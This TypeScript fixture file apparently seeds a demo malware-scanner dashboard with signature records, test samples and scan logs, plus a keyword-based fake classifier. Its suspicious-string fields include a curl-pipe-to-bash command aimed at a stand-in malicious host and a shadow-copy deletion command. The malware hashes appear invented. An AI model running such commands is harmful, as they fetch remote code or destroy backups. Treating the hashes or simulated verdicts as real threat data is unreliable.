import { MalwareSignature, ScanLog } from './types';

// Predefined known malware signatures
export const INITIAL_SIGNATURES: MalwareSignature[] = [
  {
    id: 'sig-1',
    name: 'WannaCry Ransomware v1.0',
    hash: '24d00b4315b8712a64c48972e97b372f87a3e7467651c68726e6f4a8a0f9b0f2',
    malwareFamily: 'Ransomware',
    severity: 'Critical',
    description: 'Cryptoransomware that spreads as a worm by exploiting SMBv1 vulnerabilities (EternalBlue). Encrypts user files and demands Bitcoin.',
    dateAdded: '2026-02-15'
  },
  {
    id: 'sig-2',
    name: 'Stuxnet Industrial Worm',
    hash: '18503b41e3d36e8db01cd846adcd51065163d7e58d4a670bd161a0f9689f41b9',
    malwareFamily: 'Worm',
    severity: 'Critical',
    description: 'Highly sophisticated cyber weapon targeting SCADA systems. Uses multiple zero-day exploits to manipulate programmable logic controllers.',
    dateAdded: '2026-03-01'
  },
  {
    id: 'sig-3',
    name: 'Mimikatz Credential Harvester',
    hash: 'a3f890e162d94fb82cc9b0151cd10c4d168e37e58dfa320ce1ab5ef8c82910f1',
    malwareFamily: 'Trojan/Hacktool',
    severity: 'High',
    description: 'Post-exploitation tool used to extract plaintexts passwords, hash, PIN code, and kerberos tickets from memory.',
    dateAdded: '2026-03-12'
  },
  {
    id: 'sig-4',
    name: 'Mirai IoT Botnet Client',
    hash: '5a8229b4cfb13a30c8041d8e137456d258ea3a18efcd8e32cb6fce20f671bc9e',
    malwareFamily: 'Botnet/DDoS',
    severity: 'High',
    description: 'Malware that targets smart devices running Linux, turning them into remotely controlled bots as part of a large-scale botnet network.',
    dateAdded: '2026-03-24'
  },
  {
    id: 'sig-5',
    name: 'Cobalt Strike Beacon Loader',
    hash: 'bf80d19e078e3488ad80f9708173cf764b8d7c49dfcd6e033d5fbaee2efdf970',
    malwareFamily: 'Trojan/RAT',
    severity: 'High',
    description: 'Cracked beacon payload used for persistent command & control, covert communication, and internal network lateral movement.',
    dateAdded: '2026-04-05'
  },
  {
    id: 'sig-6',
    name: 'NotPetya Wiper',
    hash: 'd39281519d08e9a26569ecdf19b8823617ea2a18ffb5d7bc6e01a8f0cf4cf6c1',
    malwareFamily: 'Wiper',
    severity: 'Critical',
    description: 'Disguised as ransomware, this malicious wiper permanently encrypts the Master File Table and destroys critical sectors of the hard drive.',
    dateAdded: '2026-04-18'
  },
  {
    id: 'sig-7',
    name: 'Carbanak Banking Trojan',
    hash: '7fa0a51e60d92fb8a9c40fdc19c8f2a3564e2a18ffcd32bcf1ae1cf0cf2bbf9a',
    malwareFamily: 'Trojan',
    severity: 'High',
    description: 'Backdoor used in advanced persistent threat campaigns against financial institutions. Allows full terminal takeover and ATM control commands.',
    dateAdded: '2026-05-10'
  },
  {
    id: 'sig-8',
    name: 'Pegasus Spyware Module',
    hash: 'e3090a1e64b8cf8fa8c9ecf019b842a256ea3a18ffbf29bcf1ae5cfcf07fcf8c',
    malwareFamily: 'Spyware',
    severity: 'Critical',
    description: 'Zero-click surveillance spyware targeting mobile operating systems. Silently intercepts calls, texts, emails, and triggers camera/microphone streaming.',
    dateAdded: '2026-06-01'
  }
];

// Predefined Suspicious Sample Files for easy testing
export interface TestSample {
  name: string;
  size: number; // in bytes
  type: string;
  sha256: string;
  description: string;
  testType: 'signature_match' | 'ml_malicious' | 'ml_benign';
  malwareFamily?: string;
  expectedResult: 'Malicious' | 'Benign';
  expectedConfidence: number; // For ML cases
  features: {
    entropy: number;
    apiCalls: string[];
    importedLibs: string[];
    suspiciousStrings: string[];
    opcodeFeatures: string[];
  };
}

export const TEST_SAMPLES: TestSample[] = [
  {
    name: 'mssecsvc.exe',
    size: 3514360,
    type: 'application/x-msdownload (.exe)',
    sha256: '24d00b4315b8712a64c48972e97b372f87a3e7467651c68726e6f4a8a0f9b0f2', // WannaCry
    description: 'Suspicious executable exhibiting rapid propagation attempt signatures. Contains WannaCry ransomware signature hash.',
    testType: 'signature_match',
    malwareFamily: 'Ransomware',
    expectedResult: 'Malicious',
    expectedConfidence: 100,
    features: {
      entropy: 7.85,
      apiCalls: ['InternetOpenA', 'InternetConnectA', 'HttpOpenRequestA', 'CreateServiceA', 'StartServiceA', 'RegSetValueExA'],
      importedLibs: ['kernel32.dll', 'user32.dll', 'advapi32.dll', 'wininet.dll'],
      suspiciousStrings: ['WANAâCRYPT0R', 'Global\\MsWinZonesCacheCounterMutexA', 'tasksche.exe', 'bitcoin_addr'],
      opcodeFeatures: ['XOR EAX, EAX', 'PUSH 0x40', 'SUB ESP, 0x20', 'CALL DWORD PTR [0x4012A0]']
    }
  },
  {
    name: 'legitimate_calculator.exe',
    size: 245760,
    type: 'application/x-msdownload (.exe)',
    sha256: '9f86d081884c7d659a2feaa0c55ad015a3bf4f1b2b0b822cd15d6c15b0f00a08', // Random
    description: 'Standard system calculator program. Should pass both signature check and ML analysis cleanly.',
    testType: 'ml_benign',
    expectedResult: 'Benign',
    expectedConfidence: 98.4,
    features: {
      entropy: 4.21,
      apiCalls: ['GetCommandLineW', 'GetStartupInfoW', 'CreateWindowExW', 'ShowWindow', 'UpdateWindow', 'DispatchMessageW'],
      importedLibs: ['kernel32.dll', 'user32.dll', 'gdi32.dll', 'comctl32.dll'],
      suspiciousStrings: ['Microsoft Calculator', 'Copyright (C) Microsoft Corporation', 'Button', 'Edit'],
      opcodeFeatures: ['MOV EAX, [ESP+4]', 'ADD EAX, EBX', 'RET', 'PUSH EBP']
    }
  },
  {
    name: 'keyboard_hook_payload.py',
    size: 4520,
    type: 'text/x-python (.py)',
    sha256: '4f29a0082f3ef428ea69ecf0141b712c9bf1f98d5dfa320ce1ab5ef8c82910f1',
    description: 'Python script with low-level keyboard hooks. Identified by ML engine due to suspicious keystroke harvesting libraries and Discord webhook strings.',
    testType: 'ml_malicious',
    malwareFamily: 'Trojan/Spyware',
    expectedResult: 'Malicious',
    expectedConfidence: 89.6,
    features: {
      entropy: 5.82,
      apiCalls: ['SetWindowsHookExA', 'CallNextHookEx', 'GetMessageA', 'GetAsyncKeyState', 'GetAsyncKeyState', 'InternetPostRequest'],
      importedLibs: ['ctypes', 'win32con', 'win32gui', 'discord_webhook', 'requests'],
      suspiciousStrings: ['pynput.keyboard', 'DiscordWebhook', 'https://discord.com/api/webhooks/', 'keylogs', 'keylogger.txt'],
      opcodeFeatures: ['None (interpreted script)']
    }
  },
  {
    name: 'zero_day_ransomware.bin',
    size: 1048576,
    type: 'application/octet-stream (.bin)',
    sha256: 'be3bcf7de5cfcf07fcf8c9ea69ecf019b842a256ea3a18ffbf29bcf1ae5cfcff',
    description: 'Obfuscated payload displaying highly irregular byte distributions and high entropy. High risk score predicted by neural networks.',
    testType: 'ml_malicious',
    malwareFamily: 'Ransomware/Zero-Day',
    expectedResult: 'Malicious',
    expectedConfidence: 96.2,
    features: {
      entropy: 7.94,
      apiCalls: ['VirtualAlloc', 'VirtualProtect', 'GetProcAddress', 'LoadLibraryA', 'WriteProcessMemory', 'CreateRemoteThread'],
      importedLibs: ['kernel32.dll', 'ntdll.dll', 'advapi32.dll'],
      suspiciousStrings: ['[UPX!]', 'VirtualAlloc failed', 'MFT_encrypted', 'shadowcopy_delete', 'vssadmin.exe delete shadows'],
      opcodeFeatures: ['XOR EAX, ECX', 'ROL EBX, 0x05', 'ADD EDX, EBP', 'JMP SHORT 0x4002C0']
    }
  },
  {
    name: 'clean_cv_document.pdf',
    size: 421800,
    type: 'application/pdf (.pdf)',
    sha256: '7dfdf818ffcd32bcf1ae1cf0cf2bbf9a56ea3a18ffbf29bcf1ae5cfcf07fcf81',
    description: 'Academic curriculum vitae formatted as PDF. Free of suspicious macro codes or hidden executable scripts.',
    testType: 'ml_benign',
    expectedResult: 'Benign',
    expectedConfidence: 99.1,
    features: {
      entropy: 3.12,
      apiCalls: ['None (Document Viewer Mode)'],
      importedLibs: ['Adobe Acrobat Reader Engine Standard APIs'],
      suspiciousStrings: ['Education', 'Experience', 'Publications', 'Contact Info', 'PDF-1.7', 'Microsoft Word - Resume'],
      opcodeFeatures: ['None (Static PDF Content)']
    }
  }
];

// Seed initial scan logs to populate charts on the dashboard
export const INITIAL_SCAN_LOGS: ScanLog[] = [
  {
    id: 'log-1',
    fileName: 'wannacry_sample_39.exe',
    fileSize: 3514360,
    fileType: 'application/x-msdownload (.exe)',
    sha256: '24d00b4315b8712a64c48972e97b372f87a3e7467651c68726e6f4a8a0f9b0f2',
    timestamp: '2026-06-23T10:15:30-07:00',
    status: 'completed',
    currentStep: 'final_verdict',
    signatureMatched: true,
    matchedSignatureName: 'WannaCry Ransomware v1.0',
    matchedSignatureHash: '24d00b4315b8712a64c48972e97b372f87a3e7467651c68726e6f4a8a0f9b0f2',
    mlMaliciousProbability: 100,
    mlBenignProbability: 0,
    finalVerdict: 'Malicious',
    detectionMethod: 'Signature-Based',
    features: TEST_SAMPLES[0].features
  },
  {
    id: 'log-2',
    fileName: 'legitimate_calculator.exe',
    fileSize: 245760,
    fileType: 'application/x-msdownload (.exe)',
    sha256: '9f86d081884c7d659a2feaa0c55ad015a3bf4f1b2b0b822cd15d6c15b0f00a08',
    timestamp: '2026-06-23T11:42:15-07:00',
    status: 'completed',
    currentStep: 'final_verdict',
    signatureMatched: false,
    mlMaliciousProbability: 1.6,
    mlBenignProbability: 98.4,
    finalVerdict: 'Benign',
    detectionMethod: 'Machine Learning',
    features: TEST_SAMPLES[1].features
  },
  {
    id: 'log-3',
    fileName: 'keyboard_hook_payload.py',
    fileSize: 4520,
    fileType: 'text/x-python (.py)',
    sha256: '4f29a0082f3ef428ea69ecf0141b712c9bf1f98d5dfa320ce1ab5ef8c82910f1',
    timestamp: '2026-06-23T14:22:01-07:00',
    status: 'completed',
    currentStep: 'final_verdict',
    signatureMatched: false,
    mlMaliciousProbability: 89.6,
    mlBenignProbability: 10.4,
    finalVerdict: 'Malicious',
    detectionMethod: 'Machine Learning',
    features: TEST_SAMPLES[2].features
  },
  {
    id: 'log-4',
    fileName: 'windows_updater_patch.exe',
    fileSize: 1845600,
    fileType: 'application/x-msdownload (.exe)',
    sha256: '18503b41e3d36e8db01cd846adcd51065163d7e58d4a670bd161a0f9689f41b9', // Stuxnet hash!
    timestamp: '2026-06-23T15:05:44-07:00',
    status: 'completed',
    currentStep: 'final_verdict',
    signatureMatched: true,
    matchedSignatureName: 'Stuxnet Industrial Worm',
    matchedSignatureHash: '18503b41e3d36e8db01cd846adcd51065163d7e58d4a670bd161a0f9689f41b9',
    mlMaliciousProbability: 100,
    mlBenignProbability: 0,
    finalVerdict: 'Malicious',
    detectionMethod: 'Signature-Based',
    features: {
      entropy: 7.91,
      apiCalls: ['WriteProcessMemory', 'LoadLibraryA', 'GetProcAddress', 'OpenProcess'],
      importedLibs: ['kernel32.dll', 'user32.dll'],
      suspiciousStrings: ['~DF394B.tmp', 'SCADA', 'Step7', 'siemens'],
      opcodeFeatures: ['MOV [ESI], EAX', 'POP EDI', 'CALL EBP']
    }
  },
  {
    id: 'log-5',
    fileName: 'student_grades_sheet.xlsx',
    fileSize: 154200,
    fileType: 'application/vnd.openxmlformats-officedocument.spreadsheetml.sheet',
    sha256: '8e818ffcd32bcf1ae1cf0cf2bbf9a56ea3a18ffbf29bcf1ae5cfcf07fcf822',
    timestamp: '2026-06-23T16:30:12-07:00',
    status: 'completed',
    currentStep: 'final_verdict',
    signatureMatched: false,
    mlMaliciousProbability: 4.8,
    mlBenignProbability: 95.2,
    finalVerdict: 'Benign',
    detectionMethod: 'Machine Learning',
    features: {
      entropy: 2.85,
      apiCalls: ['None (Spreadsheet Object)'],
      importedLibs: ['Excel Reader Runtime Core'],
      suspiciousStrings: ['Class Grades', 'Average', 'Student ID', 'FinalExam', 'Sheet1'],
      opcodeFeatures: ['None (Static Document)']
    }
  },
  {
    id: 'log-6',
    fileName: 'mimikatz_helper.exe',
    fileSize: 452100,
    fileType: 'application/x-msdownload (.exe)',
    sha256: 'a3f890e162d94fb82cc9b0151cd10c4d168e37e58dfa320ce1ab5ef8c82910f1', // Mimikatz hash!
    timestamp: '2026-06-23T18:10:02-07:00',
    status: 'completed',
    currentStep: 'final_verdict',
    signatureMatched: true,
    matchedSignatureName: 'Mimikatz Credential Harvester',
    matchedSignatureHash: 'a3f890e162d94fb82cc9b0151cd10c4d168e37e58dfa320ce1ab5ef8c82910f1',
    mlMaliciousProbability: 100,
    mlBenignProbability: 0,
    finalVerdict: 'Malicious',
    detectionMethod: 'Signature-Based',
    features: TEST_SAMPLES[2].features
  },
  {
    id: 'log-7',
    fileName: 'unknown_server_script.sh',
    fileSize: 8400,
    fileType: 'text/x-shellscript (.sh)',
    sha256: '7fa0a51e60d92fb8a9c40fdc19c8f2a3564e2a18ffcd32bcf1ae1cf0cf2bbf3a',
    timestamp: '2026-06-23T19:01:45-07:00',
    status: 'completed',
    currentStep: 'final_verdict',
    signatureMatched: false,
    mlMaliciousProbability: 68.3,
    mlBenignProbability: 31.7,
    finalVerdict: 'Malicious',
    detectionMethod: 'Machine Learning',
    features: {
      entropy: 5.12,
      apiCalls: ['curl', 'bash', 'chmod', 'sudo', 'systemctl', 'nohup'],
      importedLibs: ['Standard POSIX Commands'],
      suspiciousStrings: ['curl -sSL http://malicious-domain.com/pay.sh | bash', 'chmod +x', '/etc/cron.d/', 'base64 -d'],
      opcodeFeatures: ['None (Interpreted Bash Script)']
    }
  }
];

// Helper to generate a realistic simulated hash from a file
export function generateSHA256(fileName: string, fileSize: number): string {
  let hashVal = 0;
  const combined = fileName + fileSize.toString();
  for (let i = 0; i < combined.length; i++) {
    hashVal = (hashVal << 5) - hashVal + combined.charCodeAt(i);
    hashVal |= 0; // Convert to 32bit integer
  }
  
  // Convert hashVal to a hex string resembling SHA-256
  let hex = Math.abs(hashVal).toString(16).padEnd(8, 'e');
  // Seed a deterministic hex sequence
  const hexChars = 'abcdef0123456789';
  let fullHash = hex;
  for (let i = hex.length; i < 64; i++) {
    const charIndex = (hashVal + i * 17) % 16;
    fullHash += hexChars[Math.abs(charIndex)];
  }
  return fullHash;
}

// Generate deterministic suspicious features based on custom user uploads
export function extractFeatures(fileName: string, fileSize: number, customHash?: string): {
  entropy: number;
  apiCalls: string[];
  importedLibs: string[];
  suspiciousStrings: string[];
  opcodeFeatures: string[];
  expectedResult: 'Malicious' | 'Benign';
  confidence: number;
} {
  const name = fileName.toLowerCase();
  
  // Default values
  let entropy = 4.0 + (fileSize % 300) / 100; // Between 4.0 and 7.0
  if (entropy > 8.0) entropy = 7.95;
  
  const apiCalls = ['GetCommandLineW', 'GetModuleHandleW', 'GetProcAddress', 'HeapAlloc'];
  const importedLibs = ['kernel32.dll', 'user32.dll'];
  const suspiciousStrings = ['Analysis Demo', 'Build V3.2'];
  const opcodeFeatures = ['MOV EAX, EBX', 'PUSH EBP', 'ADD ESP, 8', 'RET'];
  let expectedResult: 'Malicious' | 'Benign' = 'Benign';
  let confidence = 75 + (fileSize % 20); // default confidence

  // Match suspicious triggers
  if (name.includes('malware') || name.includes('virus') || name.includes('crack') || name.includes('keyhook') || name.includes('hack') || name.includes('payload') || name.includes('ransom') || name.includes('.bin') || name.includes('.sh')) {
    entropy = 7.4 + (fileSize % 55) / 100; // high entropy
    apiCalls.push('VirtualAlloc', 'WriteProcessMemory', 'CreateRemoteThread', 'RegOpenKeyExA');
    importedLibs.push('advapi32.dll', 'ntdll.dll', 'ws2_32.dll');
    suspiciousStrings.push('cmd.exe /c', 'http://c2-servers.onion', 'encrypt_all_files', 'mutex_override');
    opcodeFeatures.push('XOR EAX, EAX', 'ROL EBX, 0x0C', 'JMP EDX');
    expectedResult = 'Malicious';
    confidence = 85 + (fileSize % 14);
  } else if (name.includes('setup') || name.includes('patch') || name.includes('update')) {
    entropy = 6.2 + (fileSize % 80) / 100;
    apiCalls.push('CreateFileW', 'WriteFile', 'CreateProcessW', 'ShellExecuteW');
    importedLibs.push('shell32.dll', 'advapi32.dll');
    suspiciousStrings.push('Setup Installer v1.0', 'Extracting archives...', 'TempFolder');
    opcodeFeatures.push('PUSH 0x01', 'CALL DWORD PTR [ESP+12]');
    expectedResult = 'Benign';
    confidence = 60 + (fileSize % 25);
  } else {
    // Normal benign file
    entropy = 3.5 + (fileSize % 150) / 100;
    apiCalls.push('CreateWindowExW', 'ShowWindow', 'DispatchMessageW');
    importedLibs.push('gdi32.dll', 'comctl32.dll');
    suspiciousStrings.push('Interactive Sandbox System', 'Clean Binary Assembly');
    expectedResult = 'Benign';
    confidence = 90 + (fileSize % 9);
  }

  // Cap confidence
  if (confidence > 99.9) confidence = 99.8;
  if (confidence < 50.1) confidence = 51.5;

  return {
    entropy: parseFloat(entropy.toFixed(2)),
    apiCalls,
    importedLibs,
    suspiciousStrings,
    opcodeFeatures,
    expectedResult,
    confidence: parseFloat(confidence.toFixed(1))
  };
}
